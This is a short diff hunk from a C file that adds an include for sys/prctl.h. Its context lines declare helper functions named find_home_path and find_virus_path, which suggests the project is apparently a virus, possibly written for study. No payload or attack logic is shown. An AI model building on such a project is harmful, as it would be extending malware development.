@@ -10,6 +10,7 @@
 #include <openssl/sha.h>
 #include <openssl/md5.h>
 #include <arpa/inet.h>
+#include <sys/prctl.h>
 
 extern void find_home_path(char *home_path);
 extern void find_virus_path(char *home_path);
